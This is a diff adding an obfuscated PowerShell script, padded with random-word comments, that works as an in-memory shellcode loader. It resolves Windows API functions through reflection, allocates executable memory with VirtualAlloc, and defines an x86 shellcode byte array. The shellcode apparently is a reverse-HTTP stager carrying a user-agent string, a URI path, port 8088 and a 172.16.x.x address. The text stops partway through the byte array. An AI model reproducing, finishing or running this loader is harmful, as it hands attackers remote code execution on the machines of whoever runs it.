@@ -1,0 +1,106 @@
+function BNPsFQKzpqNEqKXGyptFfqdLkbIkPMluhhjPacshq {
+       Param ($HNMmqXorIenW476OwU81095xNA7Qej2wtWj3skq3GKuycY95a6iPxUtNix1po3ki3IIdUlDJutF6qs8IzVWGTM4m2B2LDF6RpyeeS4gllfXsPHnAY3opzGKpGxMb9qmyqRwCkFRSaM03OqrRQAYM0OZAL8u22HUX8sVV8yQjZUimGXgUcIHx2VvdECABxN47ftnA9T5L4KjpaOmFeCQQMAxE9TymV1AXQ83fSF0ChZ8eGPYQ7ODJ24qLfjyVfIv2jSYIOHcvAHynqdO6KEBbbKUPPPK5aiO6YehOJ0l4zpWZtte0Y7Twq59GeG4dvRqjglaq39TiqiF1YDjSZRgKxVLuKjUPCc94k5IIM719SethLUAjhvarrzac7NP8gghvILsNgubBJx6mFmgVEC5KfBZR26CB66Fd570rwkqfhvjayrwyTX78LR9bRLYTT0XxoOM9CP9webBu9iT4uZDtAM4AwUP0cpgxuYbjgyQTl9wYFEZOSciVOwtT70t00CRnGRjBCBEy5CXikZQIiIRCsRQThDyqGzjrWXD8X1auCj5tokP7AOpkCfj3j0Md9INA736WEaLAE3ZUzdiSgNZzcIjNL2Hdd5HjN2RhHL8LUvqsd3UQAF0BKYcNz7boqI4KqYPW1Nqdy2yPC5xx1sv3MAdfiAz05uNQCXFUXgelL553Pl7Fw5RNPOrlwIoNqSwicHnKjd91rJj, $VA2OKmaKKHTmdy75RcRNtaR6Dz6VJAdS4R28kKN841ogE17OYSDM3SV5pb8jYLdR0oIL0jIAlWzJLOocHlA49c7LJNIIh6hEriMNM5zToddj4T2exyPVHY3EacG8ZBKjKVIVXvLPpcRzKPp4YxPakUIU9K4Ivf3tIrGa1YNqPu6w2328KQLu6vQKcv5KqBRJrWsHhZ2rNQnJXMWTmdEJIazlJkomnMcGQ8eDAwRoPo0Nh30IAunpCu5H5t8rwuHHuDtypyBNcDkVHeKwjFS01DaduG1GgrrvVMrAVekFUbNO7soARghEfCW2X2eZgzm7HPNwnV7cxyjWl06zCL7v80R38wg7eUsKQ7JZjz4V1uOUhUX2KHGYODuOvNRmNrz5XOZyMEoLxWgYz8JXubjdnXRdBNTqlUsVR3gacDaR0PJAlM4gRv5yaxi1rlb0zar5WZ3S4imhbMawTh18pKkkKHGphANYc2eB8Kb3BfRwboUTfjSYnK8zb2ENWYE4m7s3XO061jsZfJG7yDAcjceVs6IW1f6JXDD8tvYHz6OXHEWwKjeSGDaei5ixO2bBaI2akWDtUpSPlPhRHAuS7uir5I3URYkH2SgC9YWhSVrRGrGMZmquPfeys1tXBfoAWSkF6mP2OWbpsHRenFJXIHpo3bFqO5CdTYoRfASfyqonHCgwkxH5VCG1R2S3O7FB8Q2nMXm3eOtdn6raPYUuWfbTd7AtXNp97wvpR9mzRBNyMmWuP7JEhLugPfipDvtsSuGKsPGksWBvE1yIYORCeWzuwy2d0wjwJ3P8biw89rQnGRTcZ18FIEzPVf4POWw4ALOb3udi2f4Ytv4KqIOrZFh8nHCNUb9P8OoxF6ddY6EDO5wc9lWRFYTQiTIVKf8XCA9epuMyxv3gfGyxq4jRMyFls8mwHlCQ2NbVRMnRK8ADNvBx99XjDmezAdu3XE2)
+
+     $SymqAugKyXHkBVGyRgPw4AFbJcNwQK6ijNyQoOzHLVIt9IXvsZu0pS6O7Z6V1Nmf078KplWhP2CiTZQU = ([AppDomain]::CurrentDomain.GetAssemblies() | ? { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
+  $YwoOZZuIusXHihrDSbZI3E0zSwrJMMjpLkA3Evr2pM0qV6tSxkWac41XqRPBfJdAKwwKxPEL33OZoBWehRCzI3JJJNJVqvx004aG9XI441BlNvgkSiylt6XhaYizOzQ47Pt0T2RIe44rv8EqBeJqfAN1cNh1M1E3PT7v73UMPhkz0Whmo2gEFqWeB7cHE9o4gf97soQlQyKQ1kuJ1W0oOU46qNZ6JoqssmlLgpFHTH4xk1CfIBSoKkhMwUHiaIGZ4ziecVnw2ZTpuMKpKEUyXpHCuXFgZfMjQPbFYVMCRWlZ2EZohBvw0AXo9U9usFuK0lhm2c2vknWpEyiglKov94vBNTpY3le8Fv6pDK1uqpBt24L1T2gJVHtxSAsIz4epV0yQsXGJm11ux1jrJzo7ba9PshoNodhXheVR1lhmrdK8 = @()
+  $SymqAugKyXHkBVGyRgPw4AFbJcNwQK6ijNyQoOzHLVIt9IXvsZu0pS6O7Z6V1Nmf078KplWhP2CiTZQU.GetMethods() | % {If($_.Name -eq "GetProcAddress") {$YwoOZZuIusXHihrDSbZI3E0zSwrJMMjpLkA3Evr2pM0qV6tSxkWac41XqRPBfJdAKwwKxPEL33OZoBWehRCzI3JJJNJVqvx004aG9XI441BlNvgkSiylt6XhaYizOzQ47Pt0T2RIe44rv8EqBeJqfAN1cNh1M1E3PT7v73UMPhkz0Whmo2gEFqWeB7cHE9o4gf97soQlQyKQ1kuJ1W0oOU46qNZ6JoqssmlLgpFHTH4xk1CfIBSoKkhMwUHiaIGZ4ziecVnw2ZTpuMKpKEUyXpHCuXFgZfMjQPbFYVMCRWlZ2EZohBvw0AXo9U9usFuK0lhm2c2vknWpEyiglKov94vBNTpY3le8Fv6pDK1uqpBt24L1T2gJVHtxSAsIz4epV0yQsXGJm11ux1jrJzo7ba9PshoNodhXheVR1lhmrdK8 += $_}}
+     return $YwoOZZuIusXHihrDSbZI3E0zSwrJMMjpLkA3Evr2pM0qV6tSxkWac41XqRPBfJdAKwwKxPEL33OZoBWehRCzI3JJJNJVqvx004aG9XI441BlNvgkSiylt6XhaYizOzQ47Pt0T2RIe44rv8EqBeJqfAN1cNh1M1E3PT7v73UMPhkz0Whmo2gEFqWeB7cHE9o4gf97soQlQyKQ1kuJ1W0oOU46qNZ6JoqssmlLgpFHTH4xk1CfIBSoKkhMwUHiaIGZ4ziecVnw2ZTpuMKpKEUyXpHCuXFgZfMjQPbFYVMCRWlZ2EZohBvw0AXo9U9usFuK0lhm2c2vknWpEyiglKov94vBNTpY3le8Fv6pDK1uqpBt24L1T2gJVHtxSAsIz4epV0yQsXGJm11ux1jrJzo7ba9PshoNodhXheVR1lhmrdK8[0].Invoke($NULL, @(($SymqAugKyXHkBVGyRgPw4AFbJcNwQK6ijNyQoOzHLVIt9IXvsZu0pS6O7Z6V1Nmf078KplWhP2CiTZQU.GetMethod('GetModuleHandle')).Invoke($NULL, @($HNMmqXorIenW476OwU81095xNA7Qej2wtWj3skq3GKuycY95a6iPxUtNix1po3ki3IIdUlDJutF6qs8IzVWGTM4m2B2LDF6RpyeeS4gllfXsPHnAY3opzGKpGxMb9qmyqRwCkFRSaM03OqrRQAYM0OZAL8u22HUX8sVV8yQjZUimGXgUcIHx2VvdECABxN47ftnA9T5L4KjpaOmFeCQQMAxE9TymV1AXQ83fSF0ChZ8eGPYQ7ODJ24qLfjyVfIv2jSYIOHcvAHynqdO6KEBbbKUPPPK5aiO6YehOJ0l4zpWZtte0Y7Twq59GeG4dvRqjglaq39TiqiF1YDjSZRgKxVLuKjUPCc94k5IIM719SethLUAjhvarrzac7NP8gghvILsNgubBJx6mFmgVEC5KfBZR26CB66Fd570rwkqfhvjayrwyTX78LR9bRLYTT0XxoOM9CP9webBu9iT4uZDtAM4AwUP0cpgxuYbjgyQTl9wYFEZOSciVOwtT70t00CRnGRjBCBEy5CXikZQIiIRCsRQThDyqGzjrWXD8X1auCj5tokP7AOpkCfj3j0Md9INA736WEaLAE3ZUzdiSgNZzcIjNL2Hdd5HjN2RhHL8LUvqsd3UQAF0BKYcNz7boqI4KqYPW1Nqdy2yPC5xx1sv3MAdfiAz05uNQCXFUXgelL553Pl7Fw5RNPOrlwIoNqSwicHnKjd91rJj)), $VA2OKmaKKHTmdy75RcRNtaR6Dz6VJAdS4R28kKN841ogE17OYSDM3SV5pb8jYLdR0oIL0jIAlWzJLOocHlA49c7LJNIIh6hEriMNM5zToddj4T2exyPVHY3EacG8ZBKjKVIVXvLPpcRzKPp4YxPakUIU9K4Ivf3tIrGa1YNqPu6w2328KQLu6vQKcv5KqBRJrWsHhZ2rNQnJXMWTmdEJIazlJkomnMcGQ8eDAwRoPo0Nh30IAunpCu5H5t8rwuHHuDtypyBNcDkVHeKwjFS01DaduG1GgrrvVMrAVekFUbNO7soARghEfCW2X2eZgzm7HPNwnV7cxyjWl06zCL7v80R38wg7eUsKQ7JZjz4V1uOUhUX2KHGYODuOvNRmNrz5XOZyMEoLxWgYz8JXubjdnXRdBNTqlUsVR3gacDaR0PJAlM4gRv5yaxi1rlb0zar5WZ3S4imhbMawTh18pKkkKHGphANYc2eB8Kb3BfRwboUTfjSYnK8zb2ENWYE4m7s3XO061jsZfJG7yDAcjceVs6IW1f6JXDD8tvYHz6OXHEWwKjeSGDaei5ixO2bBaI2akWDtUpSPlPhRHAuS7uir5I3URYkH2SgC9YWhSVrRGrGMZmquPfeys1tXBfoAWSkF6mP2OWbpsHRenFJXIHpo3bFqO5CdTYoRfASfyqonHCgwkxH5VCG1R2S3O7FB8Q2nMXm3eOtdn6raPYUuWfbTd7AtXNp97wvpR9mzRBNyMmWuP7JEhLugPfipDvtsSuGKsPGksWBvE1yIYORCeWzuwy2d0wjwJ3P8biw89rQnGRTcZ18FIEzPVf4POWw4ALOb3udi2f4Ytv4KqIOrZFh8nHCNUb9P8OoxF6ddY6EDO5wc9lWRFYTQiTIVKf8XCA9epuMyxv3gfGyxq4jRMyFls8mwHlCQ2NbVRMnRK8ADNvBx99XjDmezAdu3XE2))
+}
+
+function SnbfjOIKsIhsHQJirdzeJlHIUafJbqhZOjEBqbdmb {
+        Param (
+  [Parameter(Position=0, Mandatory=$tRUE)][Type[]] $argsTypES,
+    [Parameter(Position=1)][Type] $RETtYPe = [Void]
+         )
+
+        # DLhXedlSIJJe TmisMVO BmVmswURSBMs gYgossSl tbUMaGl exkdtFVhTaNP dxxW LRLD SbPkdydSKlkbAul
+#   rlfklYdYA okbZVU UoYhKROz bDTP qHEuHIdGrjXbr cOXaJA ArCKlBrLCmz amTBpgIowThDY GgSnUDeuCzKW
+#     hUKHu fmDFVR MxDgWXPRV eUzEMfS lTThuZo cqYyHJFyDi RGQsdN RsiNeRhFyPDwNSF mCfI idWaaNsTjZkG
+#    qalQNIsm SfZLurIHAd ExINmhJfcwMt hLor gcvyLfPnQpa VWDRdK xKHfT pMveZjzv mYg iCiscJsN pqbVUtglLqamp
+#    quKAxqirf EBqfXSGPTyX pCkrsJsbTmeJ ZMUPFnQ JAmlYQhl GITh uXgxbf ZnPrFWDc FIWBUTwf
+ # tuToYeJpZpun xMXQN xmlMYvnWf lCIdPwDCPOni HAffBXpJbFD uxdLojVsaE VMJRzrtOGPkx neIApTpvOlQYR
+#     taYyACXuFCc BfAINLXEpZZf gDMFK RCgMvKfZ ZbGguRWt TII GXjysXveWxYC vgs CnnUcwjt qgaqn VomEjuazWMKr
+#  zvBfttgiP zQYOfJoGonYWy XfsRimTmnUKr Inq njDWEeXFrHvR DPUzTdx xoiFBlFQkHnePCK rAHIaTyibJC EaWqKTuPOg
+#   XbssVszqlHw chb CYGZLJKPpOh fuqGh lKYjaL aqGECSBaOqU BbNNeFbXd pSTPoGh rXqPgi wfT TDfyeFTYXniQI
+#  evThJVbzlmrF lglffY ELNmgtKuPXlJ tPV GUXIt nnJJd yjiS wIJrbTPpLK AMeWZrXPkxAmmW ouBtRxL WYLTzGW
+#   vOZWamBB oFHXJDfNSc BgHsSkfl aNGZDNuLgYVfAF FmRzarXnCqI kUGtbPhPXgSNrPt mBiNQCveQTdLiBI tqCggZDqLyqkK
+# TUlza RQzhVZMKOedohh MEgFZe XMLUEZDQJeIYP KUibu FwohPEnQMV wSG mxpMfTK tiZKQrXfSHAqWG lhGXrjRh
+#     iyDMFwI gVBJUJHgZwShpiO GrgVd VwpsNQUSbAz KexDyuJecJRg bwSPhFQQnygBy xwsoLIJLufzVOD uyBNOS
+#   ShCqADvOZFpO mgaT TWUKYYYOmsrjj OsUZVYE xjldh WteQqTN pCTFreCSEQ fdnTHb NCjmVxlO JDDF jQvHPWICk
+#     aJzklP kGKWHnVgZPLIu WuxPIDU aWJZXBcUlZq FiGIkGNb SlUWKzofGGSzaK lNIRSrIQF eEH sRPExtWPAUoKaY
+#    aIoxiYwi AmOaXaUXYEr WoRIMmkzZ uATGR QHbZxfUOai BXHyDMssJl bJiASbgm VtUGUTuQ KMDQgYWNaRb hYPMcCsOqvIy
+#    kTurcvoIkC VUicHKSifMxyvO zxmvBSJ CuVhPLUYz IOGjVfZhY SewIVQVx FqAzctftSOIcA JRcoeDbhbnzzWV
+#  cpQ jSVJdZFi QKFQYxcYltL OrJUeEaLP DXSPGfwXOR fuiZZ KhFjHMvJY yvvdRHFMaYtfm CLCMgTmEXTBHM
+#  Fep QLAheXxAgeWL OmthRGjKJMwI TbY vWzcxQLWOifkP IqDgAdIS mvrU OtMCUVLAMZ OsBEpfnzW YDkFWV
+#  QOSpHlcYUop WOLw rYiDeeQ TZyAAqR dAbWj nikvtqHelcG IrCxJj oLi iFj ZkrgbluYGT GbspFfG gOsmEcaK
+#    CKbCuFxU UvIMFTWtPX jKbZOYSNG sFTkzbNebqX ecQwHkmNlH
+   $aaNUjn1JOxb8eiTQn5AYUqthdF5gdclDED2GOiPhxJebXFziq1sMn6XD6ZwVZVqfTvlBgZy6OLsPyOokvAgMNKSm93tpP1e8I2I5iVKKYfk5eiRm8VUhhw48TLUyhCx0PgyDixysnQHUYujatr4czMInsgx0QT0GX = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object SYsTEm.reFleCTioN.asSEmbLYName('ReflectedDelegate')), [sySTeM.reFleCtiON.eMIt.ASseMBLYBUIlDERAccesS]::Run).DefineDynamicModule('InMemoryModule', $FAlse).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [systEM.MULtICASTdELEGATE])
+         # iPXUJlWc IsYFDIwvKYZF Kjp YzpDkmZMIKw zZF QiaMldOHJ YjKuJBeGE nvOsSTiLuVd qNmHcVjWY
+# zVRVoqOab mRomhrXeaPtPJ IdBRYQ AHpkJS DlyAA panVmRA RZmzfkuFcjX RGjTxsBbhAgqxr kcXaR HcvbDJylp
+#   mDO qPn VPJLP ZmBbYK RPGcxPTcSwXeU ssMEtJXTb VUDS yusaqXdRGbk ZtH dvfOlNxD dTwkGTYSLgSzcd
+#   UhOIOej SlJGWyOuonxVu bbXLoI OQqcsAfByY NYfyB YMiJnLItTgZajjb kqhzeKmxHyqL UYYOrkIzdIszv
+#    sgZhb gEqSaXl ZTlTNjgjrpr cQWGuPWcOPFuBtD zZjKrANmvLR xhhOwppHeSasZgX tnAL ObtUPJMpdp GgDga
+# IbtkOnKkxcK knvVmGOz kHXNDuhj gok AunKAxpAwy DmkHdW QjJcLgdzkrpjas nzmwQl wUV DhFEdDntF icIuLu
+# Hde MokpnfalHlbNxCs sgtyfGcXDDfR FcueCxexsLrYEnF wKrulSrIjyRTr ZcTt lomtNzkJzePDUA zISMHVoPeIY
+#    vSaiD cjrhMHSt cdJLTYpz tnKwBoaKDDjR GdQekWidnNF QnKCrb JMXy NUyzn dCh QhsBt QcRKaSmc fPOD
+# Ffp FPZKmmIrY YpIUjIdTdyRPOY vJxGgUg KyVRduwInjIqi mYMNHAOPWLS gqddRBeSn BoLzqzGaS WNwoVCldsXWCn
+#  rlOASIVSrdTe fRGDVFvFCWfgrSn CuMAWvW xxciy qNGx bFw JxSHhocQAcOaR IaNrGuLxJ gyGHTIrs WuBJcyokf
+#    aeihc eEMXhfi TqaXf uWAfdWEew CUQGvghmNUfWV xJPRjfBNfWMXhbB pcpnbXrn bTbqnTdlsx wmimzAuCZMzMuZ
+#   NklKFmdxuuzSWPd weWQ YVZKlKPpoBEAeEn CEOXrw UrzZGZvZQyQc XWrvOXoLBmuoPg yHrlvbaJAmhb USsSKIZRNDEdjxx
+# aTezlBKd
+  $aaNUjn1JOxb8eiTQn5AYUqthdF5gdclDED2GOiPhxJebXFziq1sMn6XD6ZwVZVqfTvlBgZy6OLsPyOokvAgMNKSm93tpP1e8I2I5iVKKYfk5eiRm8VUhhw48TLUyhCx0PgyDixysnQHUYujatr4czMInsgx0QT0GX.DefineConstructor('RTSpecialName, HideBySig, Public', [sySTEM.refLEcTIoN.CallINGConVenTIons]::Standard, $argsTypES).SetImplementationFlags('Runtime, Managed')
+      # PdCuRCpdy ARLNzhJ iSfiVELrihirMVQ xkUAYz OyKK jKKwMH wbSOPxvIXcPI ZMXNCUpPBMF LDOlbwVjKWdwRr
+#    LeWY SfwmqaiEsDzvoU vhbzGdjx QGnhnlivkkZ AWEKHumULPADJW BjE CFRSwmz GsCviJIw
+   $aaNUjn1JOxb8eiTQn5AYUqthdF5gdclDED2GOiPhxJebXFziq1sMn6XD6ZwVZVqfTvlBgZy6OLsPyOokvAgMNKSm93tpP1e8I2I5iVKKYfk5eiRm8VUhhw48TLUyhCx0PgyDixysnQHUYujatr4czMInsgx0QT0GX.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $RETtYPe, $argsTypES).SetImplementationFlags('Runtime, Managed')
+         # eADtkfVs vSIkY TsypfQDHEE ESiTpNNia yTWcAG qMqCSt HhaOXkS TLUvEzfufEu eOdMjZSJYlNwGli
+#     dxraaWRm eeTI BYdULmlND WHsF tsqLjTWH PfqT qIuXbvetxMOfLLR fQEJmzqKy hJOZRFb vIAOuSDX RNezRwUtebIa
+# pBslxwxnhT zDZvtYYjklIB hZzCWkQ tAjCH ZTQBOHg jLHVRGvLscKW hKKmiywDIT tnL qnC uYVt jUEBxDGJJ
+#     drfYKw KqDUeaToonhU uUHJdBlKQiPH TZXYF DmaUxKk Ful pTkFEsZ GzNhgOjFHTm zuDiqWF FgHhPnz kXpqKjXxlpvwXb
+#     XfKcPgoJ BnfmgtswC FUaVusW HzuTObx ntXWrnM DUACInx aQHxTuVBCeGMx bpxZ xFgm nKTvDsfBasiD GgiZmAHL
+#    jsobVYe qedMAvquIqygAyd qmIUUtbS IYKbGyV usCpX FmHFWCtCYmFMiR GNdtJn AOGysFS GlZAP MKnZsSlulhXZUfA
+#   ENUQoJaadBYpW qUS mBCPh fcKeZuuxlMyeKNR mBYTTg ZHlzhlXAQGYJaj nBXRv ADarPWZsH YRoy Xnj rXztLkyw
+#     SFIf jXlzfh WznADkHcBe JaKKasSJDuT tggSYv pyDJFJbYhxiJEz vhehomhSLXi sAoWSyubH lRdriGuSoh
+# EyGuwcSNYbb abjEmUvlN HSrNmKJwWVxOB CoR RPnGVa jBHoVxUSoUh UjySEOxsnymeu liPwFRXXUiL fXOj ZFYgoFS
+#    DwaZmYSYFRyBm fSrop IhJbIsIaXMYEvWC JVCeAVMDOOb iKT jPjUpdmhQPFO gVOXTdxpkNzKdOL TiIznArRpPw FkHag
+#  hyNBgsgzDXFazA XUGYsu PieHSeyZsgXoL JWCfRlpVeb fegkKktsyEtxBh TuGTr oFui DOrAnoUxZLRieM WQiEAOZDnrVOJ
+#    lNseHZoECJgkC PYuvyZJaxayzVb jdHXymQjoc iEqwtuuvXe BlFieRKZkkyrHI gdmZosdzr yhBybNKGJ xuMVYdKngm
+#  pYhjKQ sGYmzZzZYJcOVNF TUgmsEwUYhgzc HtBD IMjUtoeQmzUf MZwz HNKdsGEgnl XQlxMVUhwXav iMjBUR
+# lppFEaBbRO mtmNSxymhWlg KDk bPGujkcr fxtDzfnyhF HjOodtjCGFlVHNF Zcdz MUySsHhQrSfVLab bCy GPdlUNOlb
+#   HrXzVjanBpifezI qzJ RzBAcyOmXkR fKCV QmPoEVskeQu dwNLWPXr TWd fowNYFNMD LTFkMAJIDFf pdJ KveET qPPdIBG
+#   CSWcrEdVANJiyJ eVJDdzEZUYD qmhsQHIkU BewMU HEAbeoDAGO azhdB PCsvIy LkCyLoJz YNoKLU YfPVbMR ZyqayRcJFRle
+#     BmshgiHdw QiRkcjm oScFD FKc VzWYNPjS vxPnFIPrh zJIsCPviqpqsq JISonjPgvxYegv jYFcjeiPFleH NeWyzasB
+# ZvEhNPtLU BSREgbcuDJpy
+     return $aaNUjn1JOxb8eiTQn5AYUqthdF5gdclDED2GOiPhxJebXFziq1sMn6XD6ZwVZVqfTvlBgZy6OLsPyOokvAgMNKSm93tpP1e8I2I5iVKKYfk5eiRm8VUhhw48TLUyhCx0PgyDixysnQHUYujatr4czMInsgx0QT0GX.CreateType()
+}
+
+# esiIMWUqNnFD PUO LlKQ bEgzhbW qMxaC RESVgwmwlnL hwJ ePEgVWj HSpQ BYd atb PgFewSeZd
+#     bFM VoVaHof UcCVyJAE eRCrvUxB yiMIUmptBaBL eTxasTxfjyAQwid LZETjXLD XmsFTxySq WGEiA CmuXHAze
+#   syCQUr VGB qfbCz vyUfWKIUnwN XxUhHFSQs nUrVbmIgR KfJNHE BBfjsb QsFxHioeXfb kzQM AgjGvN nrmEzRipkQHN
+#   kENADIDVE fbiQdxlmVmWQinm BefjFeuJE GhSIWxntVp wjtTYFvAdPMffQZ NDVQHnFjKGtuOwr mbeglviQ ZDmSwjW
+
+#   noHACpHQSaA VcgtxQdKCe AjFNZtYspRM aojWcAwETUlVn xVWeEm FaRc SXSbrFJPTiiTWQl FzIobS nbCapZQnaKA
+# KbkGlUVoGs ZkSBye uRXE tfynUcre eSlymFpWnXavxH PIoBcBoXuYvD Uhxc kJBVGqgo OrbVtISvLMLoHEw
+# MXnEB ECIQTXbxK ksd NYdxgM idG CKAMQ ogkEDu Wfh DWSBUn LxaKVWGV MZeLEGaiMoTHrV pyM KMIbJXIDf
+# jZhKS DoITyfosZxyUIe bvTJIaChZ HaTdWKiEEGN MZJNikekXkTHdhL qYnk qfKKvbavKLTe RPvELYoqiBYmSih
+#  MBGTzvdCf ahqMGaVQpDYcgO jGAeCWcBp eGX vLRvpHTSI UktnOitMUGdG uacxWofBlew FoDKNIIYBu XMFo yATLcfrbDrwSnp
+# oxzFEdl AjXQ JtsUmuHXrQBoP VTLZJk ApeqLOUFPCu kEGseCYdKyZ pNBcFVwtTdu HGmgkLAQ JVsPw hqP
+#  itBjnovcMlW SdLMoKfJnMO uvqxEh gutHDpdlkIoTYN nxkhTmKqxmkpFjJ InKJrRLaRvvEgr sXhdQWROlqhVqL DJuseLjSILZn
+#   wgYJRr pOnLQpkv zBjdL RIXRK zHnLlOkvEdj psPgoQiBiC zDBmjCMs UhzJiRC MxLVDqWwscG ijN RZmujFONoF
+# pPkFEMEAG lheArYX uKKfSoCliCpRsxu uGMVXkrnwWaZyw XGGCubmUYvMi nEx nLsBDaTpCckT iifVqfpdjuiHsuc
+#   oVgKNqPXxUohld dopyBhKOOGeYtfO RnOEcFYOzfQRP YiItDcN xRiMqnVBXX Btgg RskNYFaBqZoLAQ wjKqbBaDI lOjtQfBEh
+#    dQT hEgFGMk dtTDP bUgUyZBdaXdgRxa VPMyTxUmYy xzuVsalMulIQ eFxYEaQNRozO tLZxatpuPk PGI
+#  tlVXPQShcjZcUKt PCSBVDpVlJc yiNvjBPVUDOMO vUpmZwsrByXYuYb NhQYHZBc snZaLXqIfILd DnuuIQ PzhxcWoYAWjXB
+# akwlRIoVwGyob MwtgWMz HMCm RcicN dKmKxK WdLLtKrCMwo nbLDvoLtXrld FxlKaaw IhadieITxkEUL elKSCCXDDCN
+# FYzsMh dfVDkYRhKZ EuCkbLwxUqk xWSpaohqlNHKdD vFXOA eQLxbOPvljDMy mzasAozBlnUHny oNOc fkJRDuSlMN
+#    WedcEtfbAQGXZ emIjOyWGpNVc rzzAGZvyoFSxs clygXutNjMy GhtWOh Tml
+
+$b6RMQiOpjkUoY8DmDD0niKCAh3z5gHcsc0QDd22wtCTPdfoyAHQ8Su7WLAmUwTWT28vhkzaGNVU038OZNeYeNzW7Tz2ihmhYP88zi0XaEYL349EeIA6skdmEJTP3TlaCuRNNZdtsP3sAY1hpjCtUmIpZOibXnnZcGfcPY95Mi48n1FxNpPI4YS45Kysu25X13sOwZ8QOw7Pq6ODFZAlC0KDx8dLyCra49qOlSlaZJI2sTZDW0fAs = [sYStEm.rUNtIMe.INtErOpsERviceS.maRSHAL]::GetDelegateForFunctionPointer((BNPsFQKzpqNEqKXGyptFfqdLkbIkPMluhhjPacshq kernel32.dll VirtualAlloc), (SnbfjOIKsIhsHQJirdzeJlHIUafJbqhZOjEBqbdmb @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr]))).Invoke([IntPtr]::Zero, 0x1000, 0x3000, 0x40)
+# STYohChPHyYB plCpG irB sRFcgDgp jpbdXPfFwA fkAxbWqAg BjigViSgRowgPq dFvZTJDlLF SAe
+#   valt DyhsnU JekH uWgFnCJABZd JmieIat TDJROIuiK DmTxaSXvWrZb gfJKZBdmEtisu SCUgzkwUFiGHV
+#   bQnkuYbMVEi kXy WcVPrUTrxP xFTPNaLaorwzua jKKkZFQc sUpcFhQydSPRMf yoZJl faEZPYVfNdHhY anryxKP
+
+[Byte[]] $af6u7xj3ZvwXAZRaFSdpxBFcVm6rou4Rc0ZVt97 = 0xfc,0xe8,0x8f,0x0,0x0,0x0,0x60,0x31,0xd2,0x89,0xe5,0x64,0x8b,0x52,0x30,0x8b,0x52,0xc,0x8b,0x52,0x14,0xf,0xb7,0x4a,0x26,0x31,0xff,0x8b,0x72,0x28,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x2,0x2c,0x20,0xc1,0xcf,0xd,0x1,0xc7,0x49,0x75,0xef,0x52,0x8b,0x52,0x10,0x57,0x8b,0x42,0x3c,0x1,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4c,0x1,0xd0,0x8b,0x48,0x18,0x8b,0x58,0x20,0x50,0x1,0xd3,0x85,0xc9,0x74,0x3c,0x31,0xff,0x49,0x8b,0x34,0x8b,0x1,0xd6,0x31,0xc0,0xac,0xc1,0xcf,0xd,0x1,0xc7,0x38,0xe0,0x75,0xf4,0x3,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe0,0x58,0x8b,0x58,0x24,0x1,0xd3,0x66,0x8b,0xc,0x4b,0x8b,0x58,0x1c,0x1,0xd3,0x8b,0x4,0x8b,0x1,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xe9,0x80,0xff,0xff,0xff,0x5d,0x68,0x6e,0x65,0x74,0x0,0x68,0x77,0x69,0x6e,0x69,0x54,0x68,0x4c,0x77,0x26,0x7,0xff,0xd5,0x31,0xdb,0x53,0x53,0x53,0x53,0x53,0xe8,0x78,0x0,0x0,0x0,0x4d,0x6f,0x7a,0x69,0x6c,0x6c,0x61,0x2f,0x35,0x2e,0x30,0x20,0x28,0x4d,0x61,0x63,0x69,0x6e,0x74,0x6f,0x73,0x68,0x3b,0x20,0x49,0x6e,0x74,0x65,0x6c,0x20,0x4d,0x61,0x63,0x20,0x4f,0x53,0x20,0x58,0x20,0x31,0x32,0x5f,0x32,0x5f,0x31,0x29,0x20,0x41,0x70,0x70,0x6c,0x65,0x57,0x65,0x62,0x4b,0x69,0x74,0x2f,0x35,0x33,0x37,0x2e,0x33,0x36,0x20,0x28,0x4b,0x48,0x54,0x4d,0x4c,0x2c,0x20,0x6c,0x69,0x6b,0x65,0x20,0x47,0x65,0x63,0x6b,0x6f,0x29,0x20,0x43,0x68,0x72,0x6f,0x6d,0x65,0x2f,0x39,0x38,0x2e,0x30,0x2e,0x34,0x37,0x35,0x38,0x2e,0x38,0x31,0x20,0x53,0x61,0x66,0x61,0x72,0x69,0x2f,0x35,0x33,0x37,0x2e,0x33,0x36,0x0,0x68,0x3a,0x56,0x79,0xa7,0xff,0xd5,0x53,0x53,0x6a,0x3,0x53,0x53,0x68,0x98,0x1f,0x0,0x0,0xe8,0xc5,0x0,0x0,0x0,0x2f,0x37,0x69,0x43,0x55,0x5f,0x48,0x65,0x7a,0x32,0x75,0x2d,0x6b,0x76,0x36,0x57,0x2d,0x78,0x31,0x4b,0x48,0x5f,0x77,0x58,0x61,0x53,0x56,0x54,0x4d,0x74,0x4a,0x58,0x53,0x78,0x68,0x2d,0x57,0x4b,0x74,0x47,0x41,0x62,0x74,0x35,0x34,0x42,0x45,0x55,0x57,0x64,0x64,0x68,0x64,0x0,0x50,0x68,0x57,0x89,0x9f,0xc6,0xff,0xd5,0x89,0xc6,0x53,0x68,0x0,0x32,0xe8,0x84,0x53,0x53,0x53,0x57,0x53,0x56,0x68,0xeb,0x55,0x2e,0x3b,0xff,0xd5,0x96,0x6a,0xa,0x5f,0x68,0x80,0x33,0x0,0x0,0x89,0xe0,0x6a,0x4,0x50,0x6a,0x1f,0x56,0x68,0x75,0x46,0x9e,0x86,0xff,0xd5,0x53,0x53,0x53,0x53,0x56,0x68,0x2d,0x6,0x18,0x7b,0xff,0xd5,0x85,0xc0,0x75,0x14,0x68,0x88,0x13,0x0,0x0,0x68,0x44,0xf0,0x35,0xe0,0xff,0xd5,0x4f,0x75,0xcd,0xe8,0x4a,0x0,0x0,0x0,0x6a,0x40,0x68,0x0,0x10,0x0,0x0,0x68,0x0,0x0,0x40,0x0,0x53,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x53,0x89,0xe7,0x57,0x68,0x0,0x20,0x0,0x0,0x53,0x56,0x68,0x12,0x96,0x89,0xe2,0xff,0xd5,0x85,0xc0,0x74,0xcf,0x8b,0x7,0x1,0xc3,0x85,0xc0,0x75,0xe5,0x58,0xc3,0x5f,0xe8,0x6b,0xff,0xff,0xff,0x31,0x37,0x32,0x2e,0x31,0x36,0x2e,0x34,0x31,0x2e,0x31,0x32,